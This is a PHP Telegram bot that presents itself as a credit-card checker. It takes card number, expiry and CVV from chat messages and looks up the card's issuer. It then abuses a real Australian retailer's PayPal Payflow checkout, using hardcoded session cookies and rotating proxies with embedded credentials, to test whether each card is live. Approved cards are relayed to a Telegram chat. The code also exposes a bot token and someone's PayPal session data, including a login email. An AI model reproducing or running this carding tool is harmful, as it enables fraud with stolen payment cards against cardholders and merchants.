<?php
error_reporting(0);
$botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw";
$website = "https://api.telegram.org/bot".$botToken;

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);


$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
$info = json_encode($update,JSON_PRETTY_PRINT);




$cmds11 = "
<b>Hey, welcome to this Bot! Below I show you all available commands:</b>
<u>Bin Checker:</u><code> !bin xxxxxx</code>
<u>Card-Check:</u> <code> !pf xxxxxxxxxxxxxxxx|xx|xx|xxx</code>";
 
switch($message) {
       
        case "/start":
        $reply = $update["message"]["message_id"];
                
                file_get_contents($website.'/sendMessage?chat_id='.$chatId.'&text='.urlencode("Hey! I am a CC-Checker bot with a few extras. Send /list for a list of all commands!").'&reply_to_message_id='.$reply.'&parse_mode=HTML');
                break;
        case "/list":
        $reply = $update["message"]["message_id"];
                file_get_contents($website.'/sendMessage?chat_id='.$chatId.'&text='.urlencode($cmds11).'&reply_to_message_id='.$reply.'&parse_mode=HTML');
                break;
                case "/info":
                $reply = $update["message"]["message_id"];
                file_get_contents($website.'/sendMessage?chat_id='.$chatId.'&text='.urlencode($info).'&reply_to_message_id='.$reply.'&parse_mode=HTML');
                break;
       
               
       
}

if (strpos($message, '!bin') !== false) {
$reply = $update["message"]["message_id"];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

$ccdetails = explode(" ",$message);
$separator = explode("|", $ccdetails[1]);
$cc = $separator[0];
$ano = $separator[2];
$mes = $separator[1];
$cvv = $separator[3];
$bin = substr($cc,0,6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://bins.su');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'');
$result = curl_exec($ch);
curl_close($ch);
 preg_match_all('(<tr><td>'.$bin.'</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>)siU', $result, $data);
 $country = $data[1][0];
 $vendor = $data[2][0];
 $type = $data[3][0];
 $level = $data[4][0];
 $bank = $data[5][0];

if(strlen($bin)<6){
$rep = '❌Invalid Bin';
file_get_contents($website.'/sendMessage?chat_id='.$chatId.'&text='.urlencode($rep).'&reply_to_message_id='.$reply.'&parse_mode=HTML');
}else{


$response = '
<b>BRAND: </b>'.$vendor.'
<b>TYPE: </b>'.$type.'
<b>LEVEL: </b>'.$level.'
<b>BANK: </b>'.$bank.' 
<b>COUNTRY: </b>'.$country.' '.$flag.'
<b>CHECKED BY:</b> '.$username.'
<b>BOT BY:</b>TEAM SL';

file_get_contents($website.'/sendMessage?chat_id='.$chatId.'&text='.urlencode($response).'&reply_to_message_id='.$reply.'&parse_mode=HTML');
    }            
   
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
$ii = [
  'cookie' => mt_rand().'.txt'
];

$pathhhhhh = ''.getcwd().'/COOKIE';

if (!is_dir($pathhhhhh)) {  
    mkdir($pathhhhhh, 0777, true);
}
$d1 = getcwd();
$d = str_replace('\\', '/', $d1);
$executionStartTime = microtime(true);
///////TYPE CARD////
$firstnum = $I[0];
if($firstnum == '4'){
$typee = 'Visa';
$typee2 = 'VISA';
}if($firstnum == '5'){
$typee = 'mastercard';
$typee2 = 'MASTERCARD';
}





if (strpos($message, '!pf') !== false) {
$reply = $update["message"]["message_id"];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function pasabog($sh8, $boang)
{
  $wan = str_replace($sh8, $sh8[0], $boang);
  $tobol = explode($sh8[0], $wan);
  return $tobol;
}

$ccdetails = explode(" ",$message);
$separator = explode("|", $ccdetails[1]);
$cc = $separator[0];
$ano = $separator[2];
$ano2 = substr($ano, 2,4);
$mes = $separator[1];
$cvv = $separator[3];
$bin = substr($cc,0,6);

$list = file_get_contents("https://namegenerator.in/assets/refresh.php?location=united%20states");
$list2 = json_decode($list, true);
$name1 = $list2['name'];
$name = explode(" ", $name1)[0];
$last = explode(" ", $name1)[1];
$street = $list2['street1'];
$city1 = $list2['street2'];
$city = explode(",", $city1)[0];
$state = explode(" ", $city1)[1];
$zip = explode(" ", $city1)[2];
//$phone = $list2['phone'];
$email = $name.$last.rand(111111,999999).'@gmail.com';
$pass = $name.rand(11111,99999);
$phone = rand(11111111111,88888888888);
///////////==<(RANDOM USER)))=//////=====
$pathhhhhh = ''.getcwd().'/COOKIE';

if (!is_dir($pathhhhhh)) {  
    mkdir($pathhhhhh, 0777, true);
}
$d1 = getcwd();
$d = str_replace('\\', '/', $d1);
$executionStartTime = microtime(true);

$rp1 = array(
 1 => 'xdfgglis-rotate:0fozxul6qziy',
  2 => 'buzcugvr-rotate:na05fj245weq',

    ); 
    $rotate = $rp1[array_rand($rp1)];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://bins.su');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'');
$result = curl_exec($ch);
curl_close($ch);
 preg_match_all('(<tr><td>'.$bin.'</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>)siU', $result, $data);
 $country = $data[1][0];
 $vendor = $data[2][0];
 $type = $data[3][0];
 $level = $data[4][0];
 $bank = $data[5][0];
$cbin = substr($cc, 0,6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.ryda.com.au/paypal/transparent/requestSecureToken/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'cookie: PHPSESSID=05fdd9a0adbd385ffab9ff6eb4719044; _gcl_au=1.1.363033982.1614738122; mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; form_key=ey85cSnpGAhlrIS1; _ga=GA1.3.1993881439.1614738134; _gid=GA1.3.823455809.1614738134; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-banners-cache-storage=%7B%7D; PHPSESSID=05fdd9a0adbd385ffab9ff6eb4719044; X-Magento-Vary=b0ae59cca4ef8fb4e0a3cf9be129e5c85d6f4a59; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; __atrspmx_token=fcd1031cc6f436a522400e8496b061d7bf201667e92c6a82b3410ac45c441893; mage-messages=; zip.checkout.anonymous_id=28d4fb82-c0b9-4aee-b5ce-de727d0087a0; section_data_ids=%7B%22aw-afptc-promo%22%3A1614738443%2C%22cart%22%3A1614739325%2C%22customer%22%3A1614738433%2C%22compare-products%22%3A1614738433%2C%22last-ordered-items%22%3A1614738433%2C%22directory-data%22%3A1614738433%2C%22captcha%22%3A1614738433%2C%22wishlist%22%3A1614738433%2C%22instant-purchase%22%3A1614738433%2C%22multiplewishlist%22%3A1614738433%2C%22persistent%22%3A1614738433%2C%22review%22%3A1614738433%2C%22recently_viewed_product%22%3A1614738433%2C%22recently_compared_product%22%3A1614738433%2C%22product_data_storage%22%3A1614738433%2C%22paypal-billing-agreement%22%3A1614738433%2C%22checkout-fields%22%3A1614738433%2C%22collection-point-result%22%3A1614738433%2C%22pickup-location-result%22%3A1614738433%2C%22messages%22%3A1614739325%7D; private_content_version=0152d7ea67e4d4cb0bd270513f1a7cf9; _nx-nocache=1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_key=ey85cSnpGAhlrIS1&payment%5Bmethod%5D=payflowpro&captcha_form_id=co-payment-form&controller=checkout_flow&cc_type='.$cbin.'');
$result1 = curl_exec($ch);
$sectok = GetStr($result1, '"securetoken":"','",');
$secid = GetStr($result1, '"securetokenid":"','"');





$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://payflowlink.paypal.com/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'content-type: application/x-www-form-urlencoded';
//$headers[] = 'cookie: KHcl0EuY7AKSMgfvHl7J5E7hPtK=S9QFleCKZX3CiexOT-a7U-blBF9RVLmi4cmaVSmoIPIgi4R2wxBdnW-ALl9CslEPBq__r0Nx1tS7kOAY; cookie_check=yes; _gcl_au=1.1.706975343.1613944106; login_email=jackhayabusa%40gmail.com; ui_experience=d_id%3D4MaZyLdjKf3SP1JdrBrEEqDD52UA9eoa1613944503994%26login_type%3DEMAIL_PASSWORD%26home%3D2%26ph_conf%3D3%253A1615154236590; x-csrf-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6IlpGenFMUW5yVVZzMnczNEVpczVaWVg5Q0stS0JuVnI2RXpJU19UMWVZUkh2dmROS0ZKWVcwNVVSdjlYY09EbnFiLThNak96dG1nSTRDYzlMYTdLSFBqTnZWTlhsWGlpZmRWdnhzUE92azBKUlBMbGV5WUhVNE01aGJfS01MRS14S3FGbUprcTdKa01NLTJWYjR5UUk5T0xyRVdPZGowQjJ6Rkw0dVJGbUVucHRqRk9RalRxcEgwbDhLRFBmaG5qNXdLOHpsWDhwOXdVWkpxcW5nSDg2T09pd2FfUyIsImlhdCI6MTYxNDU4NjMxMCwiZXhwIjoxNjE0NTg5OTEwfQ.hYyMNNTcRVanjKKwBwQ4woeICNAOItlduSCccN_yPP8; ts_c=vr%3Df6aff6971760a1d5415da749fb8e5819%26vt%3Df3e028041770a760b643d439fe86bb3b; _gcl_aw=GCL.1614704303.Cj0KCQiA4feBBhC9ARIsABp_nbVKeu2-dhyrD0AlFayL4I4CGevBeogAOg7Tps53nQtmspk6nCGU_OEaAjzOEALw_wcB; _gcl_dc=GCL.1614704303.Cj0KCQiA4feBBhC9ARIsABp_nbVKeu2-dhyrD0AlFayL4I4CGevBeogAOg7Tps53nQtmspk6nCGU_OEaAjzOEALw_wcB; fn_dt=91fd4345c22f430f8528270a613336f4; id_token=idtoken8bde0c9af0394aeb9f4f593e34e2d8bb; rmuc=NNabCz11gyHZDwnOMS2CIgGz_EGQrBJiHEs9j_N8bW8tWM-gtMDsL6ZJLW-oJN9RNpWAnscu85nOEB_HPAyYNO1zyo1lBDAr8dQGVvqVtE_aqvTcQ6kyFQkcZ3BUQgVb7Kum6GbvV2BDxm0Ml0wCGDNfEmKpwpyVvO6cxvR35ZRjqVDUk6QQYXnMOMRdgCFkeQpLVhT0B82urPRjPxNx0T0UzJ9bxb4wPR9EQtwYv4TxY1RLb550ZE2I4y6ZYvjTx6tNEI01hR4lWpgNezlA2SPcSn9xU0V9oY9BJFKdvdmaBQ1FRkzjj_hoti-f3rVhzL4-pG; X-PP-ADS=AToB0W4-YLgg9w5LvGq8TFGuZHkGuQc; SEGM=bRdV1vB0ebq9RKdAb3xSHowCi6QnnlCiDOLNk8i1mAuLl1vTbzHQwWajSsMe8mvoWiJtY1GnpzN4Y-sixGy7BQ; HaC80bwXscjqZ7KM6VOxULOB534=51cDORBXBkO-2laZzA6PBNSHH2OR2zZ9cTUx8Zurw2D4e4mZvNbUG0koT7JnomRuxi0ls4REiz4aBN1D2rIJEHS13SUFX7fT4AS_wt6hsc0cjE0_gOqXg5zqQsywRFoButHpm0; x-pp-s=eyJ0IjoiMTYxNDcwNDc1MzQ4MyIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1709399163%26vteXpYrS%3D1614706563%26vr%3Df6aff6971760a1d5415da749fb8e5819%26vt%3Df3e028041770a760b643d439fe86bb3b%26vtyp%3Dreturn';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'result=0&securetoken='.$sectok.'&securetokenid='.$secid.'&respmsg=Approved&result_code=0&csc='.$cvv.'&expdate='.$mes.''.$ano.'&acct='.$cc.'&form_key=ey85cSnpGAhlrIS1');



$result = curl_exec($ch);
$cvc = GetStr($result, '<input type="hidden" name="PROCCVV2" value="','"/>');
$avsres = GetStr($result, '<input type="hidden" name="AVSDATA" value="','"/>');
$mesg = GetStr($result, '<input type="hidden" name="RESPMSG" value="','"/>');
$respo = GetStr($result, '"code": "','",');
$resp = GetStr($result, '"message": "','"');
$message = trim(strip_tags(getStr($result,'"messages":"','"')));
curl_close($ch);

switch ($mesg) {
    case strpos($cvc == 'M'):
    $head = 'Payflow = LIVE';
        
        break;
    
    default:
        $stats = 'Dead';
        break;
}
if ($cvc == 'M') {
  $head = '✅ PAYFLOW AUTH - LIVE';
  $stats = 'Approved';
  $botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw";
$chat_id = $chatid
$message = "APPROVED CVV
Card: $cc|$mes|$ano|$cvv
Response: AUTH
Made By: Moneris ";
$bot_url    =  "https://api.telegram.org/bot$botToken/";
$url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
file_get_contents($url);
}

else{
  $head = '❌PAYFLOW = DEAD';
}

$response = '
<b>'.$head.'</b>
<b>CC: </b>'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'
<b>Response:</b> '.$stats.' - '.$cvc.' - '.$mesg.'
<b>BRAND: </b>'.$vendor.'
<b>TYPE: </b>'.$type.'
<b>LEVEL: </b>'.$level.'
<b>BANK: </b>'.$bank.' 
<b>COUNTRY: </b>'.$country.' '.$flag.'
<b>CHECKED BY:</b> '.$username.'
<b>BOT BY:</b> @Moneris';

file_get_contents($website.'/sendMessage?chat_id='.$chatId.'&text='.urlencode($response).'&reply_to_message_id='.$reply.'&parse_mode=HTML');

}


 
unlink("".$d."/COOKIE/".$ii['cookie']."");

#===============+======================================================#===========================================

 

?>
